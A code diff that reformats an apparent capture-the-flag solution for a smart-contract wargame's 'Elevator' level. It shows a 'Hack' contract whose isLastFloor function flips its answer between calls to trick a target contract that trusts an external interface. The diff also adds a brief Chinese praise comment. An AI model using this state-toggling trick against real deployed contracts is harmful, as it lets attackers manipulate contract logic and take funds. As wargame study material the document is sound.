@@ -20,19 +20,16 @@ contract Elevator {
 }
 
 contract Hack {
-  // our instance 
+  // our instance     优秀的写法 
   address instance = 0x35D1366166142287bBc00285CE70ee62eB775c41;
   Elevator public target;
   bool result = true;
+  
   function isLastFloor(uint) public returns (bool){
     // or shorter: result = !result
-    if(result == true)
-    {
-      // first call = false
+    if(result == true) {  // first call = false
       result = false;
-    }
-    else {
-      // second call = true 
+    }else {      // second call = true 
       result = true;
     }
     return result;
